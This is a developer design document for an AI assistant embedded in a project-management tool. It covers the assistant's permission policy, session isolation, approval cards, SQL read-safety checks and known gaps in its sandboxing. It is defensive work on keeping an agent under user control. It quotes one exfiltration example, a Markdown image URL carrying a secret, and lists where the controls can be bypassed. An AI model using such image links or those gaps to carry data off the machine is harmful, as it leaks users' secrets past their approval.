# PPM Assistant

> Part of [AI Chat & Providers](ai-chat-and-providers.md#ppm-assistant).

An AI chat that works *on PPM* rather than on a project: it sees the screen of the device the
user is chatting from, finds and reads chats, reads databases and open tabs, opens and closes
tabs, switches projects, runs Command Palette commands, and sends messages into the user's
working chats. It runs on Claude and Codex. It reads content it did not write — other chats,
database rows, terminal output — so the design rule is: **navigating and reading inside the
registered projects run unasked; anything that changes data or could carry data off the
machine asks first**, whatever mode the composer shows.

## Sessions

**A virtual project.** Assistant sessions live in the reserved project `__assistant__`
(`src/shared/assistant-project.ts`). Only the chat path resolves it — the chat WebSocket and
the `/chat` sub-router, through `resolveChatProjectPath` (`src/server/helpers/resolve-chat-project.ts`)
— so it never gets a terminal, LSP root, git surface or file tree. `projectService` refuses to
register a real project under that name, and the browser keeps it out of URLs, the project
picker and workspace sync.

**The work directory** is `<ppm dir>/assistant/<database name>` (`assistant-work-dir.ts`), one
per database file, because dev (`ppm.dev.db`) and production (`ppm.db`) share the PPM dir and
both providers list a project's sessions by working directory. One shared folder would show each
instance's Assistant chats in the other's list.

**Marking a session.** `session_metadata.assistant` (migration 57) is written when the session
is created, and copied when Codex renames the session on its first turn and when a session is
forked. `isAssistantSession` (`src/services/assistant/assistant-session.ts`) answers true on the
mark of the id, the mark of the id it migrated to, *or* the session's working directory being
the Assistant's. Losing the answer is the dangerous direction — an Assistant session read as an
ordinary one falls back to the provider default, usually bypass — so any one source is enough.
Assistant sessions never adopt a warm spare and get no tab tools.

**Permissions** ignore the composer's mode. Claude is forced to `default`, because the policy
lives in the PreToolUse hook and bypass mode installs no hook; `assistantToolDecision`
(`src/services/assistant/assistant-tool-policy.ts`) decides there, with the same check as a
`canUseTool` backstop. It allows only Read, Glob and Grep that resolve inside a registered
project and outside the private roots (`assistant-private-paths.ts`: PPM's own credential
folders plus the login and key stores common tools keep under the home folder, which matter when
a project is registered at or above home), ToolSearch, TodoWrite, and the Assistant's own MCP
tools by exact name. Everything else asks: web, shell, writes, subagents, skills, other MCP
servers, reads anywhere else. It fails closed: a path that cannot be resolved, a relative path
with no working directory, or a Windows network path (answered without touching the disk) asks.
Codex gets its own profile (below).

**The UI.** One tab type, `assistant` (`src/web/components/assistant/`): on a desktop it opens
inside a `tab-host` floating window, below `md` it stays a tab, and it belongs to no project so
it comes onto whichever grid is on screen. It holds the session list, a new-session button per
provider that `supportsAssistantSessions`, and the chat with its permission chip locked. It opens
from the Command Palette (*PPM Assistant*), an unbound keybinding (`open-assistant`) and
notifications, all through `openAssistant`.

## Isolation

The Assistant inherits none of the user's own agent setup or of ordinary chats' settings.
Settings → AI & Accounts → **PPM Assistant** (`/api/assistant/settings`, config key `assistant`,
shape and validation in `src/shared/assistant-settings.ts`) holds its default provider, a model
and effort per provider, extra instructions appended after PPM's own, and its own MCP servers.
Those servers' `env` and header values never reach a browser (the whole list is in
`SECRET_CONFIG_KEYS`), and a saved header is dropped when its server's URL moves to another
origin.

- **Claude**: the query runs with `settingSources: []` — no user or project settings, hooks,
  plugins, skills or `CLAUDE.md`, the way `completeOnce` runs — plus `strictMcpConfig`, so the
  MCP servers are exactly the Assistant's own (`assistantMcpServers`). The provider's
  *Additional Instructions* are not applied. Authentication is unaffected (it comes from
  `buildQueryEnv` and the CLI's credential store), but anything only `~/.claude/settings.json`
  provides is gone, its `env` block and `apiKeyHelper` included.
- **Codex**: a separate permission profile, `ASSISTANT_PERMISSION` (read-only sandbox,
  `untrusted` approvals), and mandatory developer instructions — a Codex too old to take them
  fails the session (`RequiredInstructionsError`) instead of running it uninstructed. Codex has
  no switch for "ignore my `config.toml`", so `planAssistantCodexMcp`
  (`codex-assistant-mcp-guard.ts`) reads the effective config back with `config/read` and
  `assistantSessionConfig` (`codex-thread-params.ts`) disables each of the user's servers by
  name, turns off web search, apps, plugins, hooks and `notify`, and adds the Assistant's
  servers. An unreadable config refuses the session; so does a user server with the same name
  as one of the Assistant's, because Codex merges same-named tables key by key.
- **Shared context**: the user's shared instructions and memories are not added to Assistant
  turns, whatever `share_provider_context` says. Only the UI summary rides in that block.
- **External resources**: Assistant Markdown never makes the browser fetch anything by itself.
  `markdown-external-resources.ts` turns external images and embeds into links and holds the
  rest to an allowlist (`markdown-assistant-allowlist.ts`), because a rendered
  `![](https://x/?k=<secret>)` would send the secret with no click and no approval.

## Tools: `/api/assistant-mcp`

One endpoint serves both providers (`src/services/assistant-mcp/assistant-mcp-endpoint.ts`,
mounted before PPM's auth). It is built on the same `mcp-http-endpoint.ts` and
`mcp-session-tokens.ts` as the tab tools: a per-session capability token, held in memory and
revoked when the session is deleted. A token is honoured only while its session — followed
through a Codex rename — is still an Assistant session, checked on every request. Calls are held
open past Bun's 10 s idle cut (`ASSISTANT_MCP_HOLD_OPEN_SECONDS`), and the providers get a
12-minute tool timeout, because a query may run long and an approval may wait.

Every tool that takes a project checks it against the registered projects, and every tool
taking a `sessionId` proves the session belongs to that project and is not an Assistant
session. The names, in order, are `ASSISTANT_TOOLS` in `src/shared/assistant-tool-names.ts`
(Claude spells them `mcp__ppm-assistant__<tool>`, Codex `ppm_assistant:<tool>`).

- **Read, never ask**: `projects_list`, `chat_list_sessions`, `chat_search`,
  `chat_read_messages`, `db_list_connections`, `db_query` for a proven read, `ui_get_state`,
  `ui_read_tab` inside the registered projects, `ui_list_commands`.
- **Navigate the chatting device, never ask**: `ui_open_tab`, `ui_focus_tab`,
  `ui_switch_project`, and `ui_close_tab` for a tab that loses nothing. Each answers
  `previousProject` or enough to reopen what it closed, so the agent can undo — there is no
  Undo of PPM's own.
- **Ask first**: `db_query` for anything not proven to read, `chat_send_message` (always),
  `ui_run_command` for a command declared `changesData` and for every extension command,
  `ui_close_tab` for a tab that would lose work (unsaved editor text, unsaved SQL or table edits,
  a terminal), and `ui_read_tab` for a file or terminal outside every registered project or a
  file in a credential store.

Databases follow the user's per-connection choices: a connection with *Available to the AI
chat* off (`ai_access = 0`) is neither listed, queried, opened nor read through a database tab,
and a read-only connection never runs a write, approved or not. Every statement is audited with
`actor = "agent"`.

## The chatting device

Only the browser knows what it shows, so the screen tools are a round trip through a device
broker (`createDeviceBroker` in `tab-open-broker.ts`, keyed by `resolveMigratedSession`) over the
chat WebSocket (`assistant_ui` / `assistant_ui_result`, `src/shared/assistant-ui-protocol.ts`).
Delivery is **strict**: `deliverToChattingDevice(…, { strict: true })` in `src/server/ws/chat.ts`
sends only to the device that sent the session's latest message. If that socket has gone, only
the same browser tab reconnected qualifies, recognised by the per-tab `clientId` it connects
with (`src/shared/chat-client-id.ts`); otherwise the call answers `no-device`. It never falls
back to every device, unlike the tab tools, because switching project or running a git pull on a
screen nobody is talking from is not harmless. The browser half is
`src/web/lib/assistant-ui/` (`answer-assistant-ui.ts` dispatches by `op`), and it answers only
for an Assistant session.

**The per-turn UI summary.** Each Assistant message carries a short picture of the sender's
screen, built in the browser (`ui-summary.ts`), validated, cleaned and capped on the server
(`assistant-ui-summary.ts`), and placed as one entry *inside* the `<ppm-shared-context>` block —
not a new tag — so the existing `stripSharedContext` keeps it out of history, titles and search.
It is sent regardless of `share_provider_context`, skipped for `/` commands, labelled as data,
and never includes tab content: the agent calls `ui_read_tab` when it needs that.

**Commands** come from one registry shared by the palette, the global keybindings and the
Assistant (`src/web/lib/commands/command-registry.ts`). Each command declares `changesData`; an
extension's command is always treated as changing data. `ui_run_command` reads that flag from
the device's own `list_commands` entry before anything runs, and only a run request built after
approval carries the `approved` marker the device requires.

## Approvals

**One card per session.** A session shows one approval card at a time, shared between the
provider's own approvals (Claude's permission hook; Codex's command and patch requests, and its
MCP tool approvals for the servers configured in Settings → PPM Assistant, which always ask) and
the endpoint's. They queue behind each
other instead of overwriting, and every way a card leaves goes through
`src/server/ws/chat-pending-approval.ts`, which finishes the request on whichever side waits for
it. Typing a message instead of answering, stopping the turn, or the turn ending withdraws an
endpoint request with that reason.

**The endpoint's broker** (`assistant-approval-broker.ts`) puts the card on every device showing
the session (it is a question, not a screen action), sends the usual approval notification, and
takes the first answer. The answer window is ten minutes from when the card is *shown*; a
request that never reaches the screen ends before the providers' own tool timeout, and the reply
says which happened. `PPM_ASSISTANT_APPROVAL_TIMEOUT_MS` can shorten the window for tests, never
lengthen it. Outcomes are approved, denied, timeout, withdrawn or unavailable, and only approved
runs anything.

**What the card shows** is built by the server from the checked input, never from the agent's
own wording (`assistant-approval-summary.ts`): the full SQL or message, wrapped, with hidden and
bidirectional characters made visible, and for `chat_send_message` the target chat's permission
mode and where it comes from. That mode is checked again at send time and the message is not sent
if it changed. Every chat now has its permission mode stored on the server for this reason.

**Stale answers.** An `approval_response` for a request nothing holds any more — answered on
another device, ended, or from before a restart — gets `approval_stale` and "no longer valid",
never an `approval_resolved`, so a card from before a restart cannot look as if it ran.

## Proving a read

A read-only transaction is not proof that a query only reads: functions can still terminate
backends, take locks, write through another connection or sleep. So `db_query` runs unasked only
when two checks pass, and anything else goes to an approval card:

1. **The text** (`assistant-sql-safety.ts`): a plain read, no assigning `PRAGMA`, no locking
   clause, and every function called is on a short safe list (aggregates, string, date, math,
   JSON accessors, casts). A read that misses the list costs one question, by design.
2. **What the text reaches** (`assistant-sql-reach-check.ts`), asked of the catalog on the
   read-only path without planning or running the query:
   - **Postgres** (`assistant-sql-reach-postgres.ts`): views and row-level policies the query
     can reach, generated columns, domain checks, user casts, user functions named like any word
     of the query, and user operators, each judged by the same rules. `EXPLAIN` is not used, because
     planning runs user code; the file header records what was measured.
   - **MySQL/MariaDB** (`assistant-sql-reach-mysql.ts`): any view the query could name, or a
     stored function named like a safe-listed call, sends it to approval.
   - **SQLite**: no catalog read. A view can only call SQLite's built-ins, `load_extension()` is
     refused by bun:sqlite, and the file is opened read-only.

Any catalog error means asking, never running. A proven read then runs on the connection's
read-only path with a 60 s limit (`UNASKED_READ_TIMEOUT_MS`) and is stopped when the MCP call
closes (`src/services/database/query-stop.ts`). An approved query is the user's to run to the end.

## Known limitations

- **Codex runs commands it deems safe without asking.** Under `untrusted`, its trusted read-only
  commands (`cat`, `ls`, …) run unasked and can read outside the registered projects; there is no
  per-path rule to give it. With Codex, what keeps that content on the machine is that every way
  out (web, shell beyond that set, writes, messages, MCP) asks or is off, and the read-only
  sandbox has no network (not checked by hand on Windows).
- **Codex still loads the user's global `AGENTS.md`** from `CODEX_HOME`, and the user's Codex
  skills: codex 0.161 has no setting that leaves them out while keeping the session's own
  instructions.
- **SQLite reads cannot be stopped.** bun:sqlite runs a statement synchronously with no
  interrupt, so the 60 s limit and the abort apply only before a statement starts.
- **MySQL/MariaDB**: the reach check's catalog query has been verified only by unit tests over
  sample rows, not against a live server; the Postgres one has an integration test
  (`tests/integration/assistant-sql-reach-postgres.test.ts`). The MySQL check also does not see
  loadable functions, which only an administrator installs.

## Verify

`PPM_PLAYWRIGHT_MODULE=<playwright>/index.mjs node tests/e2e/assistant-e2e.mjs` runs the
Assistant on the production bundle, on a desktop and a phone viewport, against a scripted
provider (`tests/e2e/fixtures/assistant-server.ts`) that calls the real endpoint with each turn's
token and an isolated `PPM_HOME`. The header of the test file lists its scenarios and options.
